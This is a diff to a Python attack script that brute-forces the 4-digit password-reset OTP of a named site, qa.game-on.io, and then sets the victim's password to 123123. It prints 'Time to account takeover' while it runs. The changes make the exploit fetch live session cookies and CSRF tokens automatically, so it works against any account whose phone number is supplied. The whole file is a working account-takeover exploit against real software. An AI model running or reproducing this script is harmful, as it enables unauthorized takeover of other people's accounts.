@@ -1,55 +1,63 @@
 import requests, sys
 from bs4 import BeautifulSoup
 from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-def pass_brute(otp):
+def open_browser():
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
+    }
+    browser = requests.get('https://qa.game-on.io/reset-password', verify=False, headers=headers)
+    return browser
+    
+
+def pass_brute(otp, browser):
     session = requests.Session()
     URL = 'https://qa.game-on.io/resetverify'
     # http_proxy = {
     #     'http': '127.0.0.1:8080',
     #     'https': '127.0.0.1:8080'
     # }
+    cookies = browser.cookies.get_dict()
+    cookies = {'XSRF-TOKEN': cookies['XSRF-TOKEN'],'gameon_session': cookies['gameon_session']}
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
-        'Cookie': '_ga=GA1.2.1846406014.1598247358; _gid=GA1.2.394578595.1598247358; XSRF-TOKEN=eyJpdiI6Ik1HSURDYnpKYTlGSWMwVTBVS2FXdkE9PSIsInZhbHVlIjoia2ZPNkJ5NWlUcXN5T1MvMG1sMzlhMFZNbUI0TWxQZWZMcFFZL21VN0UxcFRvdUg5T1E0aDJZMjZCZk1hUENPMHE5QWd1NlMvcTk4TkdvczI5WWg4S2U0Nll1WmdVQ0NqeG41RlRsYlFNcHNqaFpFeGM2MWhtQXl5MVkvWEIvTGUiLCJtYWMiOiIzMWM3MGY0MzUxYjI1OTQxZjlhYTc2NTRiMjU2MzAyNjIzMzM2ZWUzOWNjN2M5YWMzN2IzYjE1ZjU0OTZiNGZhIn0%3D; gameon_session=eyJpdiI6IjAzT3hqZU4wR0hXbm9vNTlPOW42YVE9PSIsInZhbHVlIjoiSk9SSHVHRy9jRzhnNWpHZUxBczBMdzB2cmtVY1hGSENKZ2M4cEpxQ1hPeUdPMmxVK3M3dVUrakdwZ2JsdUZ6NjdndnYzTG1wWUdyMGtwSVhIWUxIckZ4c3dNT2ljQm1lVGp3TDdManZwK09tM0x5bnBuZGg2OXlKdUczb25VVlIiLCJtYWMiOiJlZmRhN2I3YmYwNjIyZjkyZTAyODhjMTVhODE0ZmQyOWRjMTRlNzZjODA4MDA0OGVmYzM2Nzk3ZjYzODM5Y2E5In0%3D',
-    }
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
+        }
     payload = {
-        '_token': 'HnATZhYUKW44vGFYTN4AtxTbOedcGbiVpN4IzA3H',
+        '_token': get_value(browser.content, '_token'),
         'code1': str(otp)[0:1],
         'code2': str(otp)[1:2],
         'code3': str(otp)[2:3],
         'code4': str(otp)[3:4],
     }
-    #requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)  
-    response = session.post(url=URL, data=payload, 
+    response = session.post(url=URL, data=payload , cookies = cookies,
             verify=False, headers=headers)
     return response
 
 def reset_pass(number):
     session = requests.Session()
     URL = 'https://qa.game-on.io/reset-password'
+    browser = open_browser()
+    cookies = browser.cookies.get_dict()
+    cookies = {'XSRF-TOKEN': cookies['XSRF-TOKEN'],'gameon_session': cookies['gameon_session'] }
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
-        'Cookie': '_ga=GA1.2.1846406014.1598247358; _gid=GA1.2.394578595.1598247358; XSRF-TOKEN=eyJpdiI6Ik1HSURDYnpKYTlGSWMwVTBVS2FXdkE9PSIsInZhbHVlIjoia2ZPNkJ5NWlUcXN5T1MvMG1sMzlhMFZNbUI0TWxQZWZMcFFZL21VN0UxcFRvdUg5T1E0aDJZMjZCZk1hUENPMHE5QWd1NlMvcTk4TkdvczI5WWg4S2U0Nll1WmdVQ0NqeG41RlRsYlFNcHNqaFpFeGM2MWhtQXl5MVkvWEIvTGUiLCJtYWMiOiIzMWM3MGY0MzUxYjI1OTQxZjlhYTc2NTRiMjU2MzAyNjIzMzM2ZWUzOWNjN2M5YWMzN2IzYjE1ZjU0OTZiNGZhIn0%3D; gameon_session=eyJpdiI6IjAzT3hqZU4wR0hXbm9vNTlPOW42YVE9PSIsInZhbHVlIjoiSk9SSHVHRy9jRzhnNWpHZUxBczBMdzB2cmtVY1hGSENKZ2M4cEpxQ1hPeUdPMmxVK3M3dVUrakdwZ2JsdUZ6NjdndnYzTG1wWUdyMGtwSVhIWUxIckZ4c3dNT2ljQm1lVGp3TDdManZwK09tM0x5bnBuZGg2OXlKdUczb25VVlIiLCJtYWMiOiJlZmRhN2I3YmYwNjIyZjkyZTAyODhjMTVhODE0ZmQyOWRjMTRlNzZjODA4MDA0OGVmYzM2Nzk3ZjYzODM5Y2E5In0%3D',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
     }
     payload = {
-        '_token': 'HnATZhYUKW44vGFYTN4AtxTbOedcGbiVpN4IzA3H',
+        '_token': get_value(browser.content, '_token'),
         'username': number
     }
-    #requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
-    response = session.post(url=URL, data=payload,
-            verify=False, headers=headers)
+    response = session.post(url=URL, data=payload,verify=False, headers=headers, cookies = cookies)
     if response.status_code == 200:
-        return True
-    else:
-        return False
+        return True, response
 
 
-def set_newpass(userid, token):
+def set_newpass(userid, token, browser):
     URL = 'https://qa.game-on.io/new-password'
+    cookies = {'XSRF-TOKEN': browser['XSRF-TOKEN'],
+               'gameon_session': browser['gameon_session']}
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
-        'Cookie': '_ga=GA1.2.1846406014.1598247358; _gid=GA1.2.394578595.1598247358; XSRF-TOKEN=eyJpdiI6Ik1HSURDYnpKYTlGSWMwVTBVS2FXdkE9PSIsInZhbHVlIjoia2ZPNkJ5NWlUcXN5T1MvMG1sMzlhMFZNbUI0TWxQZWZMcFFZL21VN0UxcFRvdUg5T1E0aDJZMjZCZk1hUENPMHE5QWd1NlMvcTk4TkdvczI5WWg4S2U0Nll1WmdVQ0NqeG41RlRsYlFNcHNqaFpFeGM2MWhtQXl5MVkvWEIvTGUiLCJtYWMiOiIzMWM3MGY0MzUxYjI1OTQxZjlhYTc2NTRiMjU2MzAyNjIzMzM2ZWUzOWNjN2M5YWMzN2IzYjE1ZjU0OTZiNGZhIn0%3D; gameon_session=eyJpdiI6IjAzT3hqZU4wR0hXbm9vNTlPOW42YVE9PSIsInZhbHVlIjoiSk9SSHVHRy9jRzhnNWpHZUxBczBMdzB2cmtVY1hGSENKZ2M4cEpxQ1hPeUdPMmxVK3M3dVUrakdwZ2JsdUZ6NjdndnYzTG1wWUdyMGtwSVhIWUxIckZ4c3dNT2ljQm1lVGp3TDdManZwK09tM0x5bnBuZGg2OXlKdUczb25VVlIiLCJtYWMiOiJlZmRhN2I3YmYwNjIyZjkyZTAyODhjMTVhODE0ZmQyOWRjMTRlNzZjODA4MDA0OGVmYzM2Nzk3ZjYzODM5Y2E5In0%3D',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
     }
     payload = {
         '_token': token,
@@ -57,9 +65,8 @@ def set_newpass(userid, token):
         'password': 123123,
         'password_confirmation': 123123
     }
-    #requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
     response = requests.post(url=URL, data=payload,
-                            verify=False, headers=headers)
+                            verify=False, headers=headers, cookies = cookies)
     if response.status_code == 200:
         print('[+] Password has changed successfully. New pass: 123123')
 
@@ -68,27 +75,26 @@ def get_value(sesion, name):
     inputid = soup.find("input", {'name': name})
     return inputid['value']
 
-def magic():
+def magic(browser):
     for otp in range(1111, 9999):
-        response = pass_brute(otp)
-        response_code = response.status_code
-        # print('[-] OTP: ', otp, ' response : ',
-        #       response_code, 'url : ', response.url)
+        response = pass_brute(otp, browser)
         if response.url == 'https://qa.game-on.io/new-password':
             print("[+] OTP Found! : ", otp)
-            print("[+] Getting input values...")
             userid = get_value(response.content, 'userid')
             token = get_value(response.content, '_token')
+            cookies = response.cookies.get_dict()
             print("[+] Setting new password ...")
-            set_newpass(userid, token)
+            set_newpass(userid, token, cookies)
             break
 
 if __name__ == '__main__':
-    if sys.argv[1]:
+    if len(sys.argv) == 2:
         print("[+] Trying to send OTP.")
-        if(reset_pass(sys.argv[1])):
+        reset = reset_pass(sys.argv[1])
+        if(reset[0]):
             print("[+] Sending OTP successfull to ", sys.argv[1])
-            print("[+] Time to account takeover. It will take less than 5 minutes.")
-            magic()
+            print("[+] Time to account takeover. It will take more or less 5 minutes.")
+            magic(reset[1])
     else:
         print('Please pass an arugemnt!')
+        
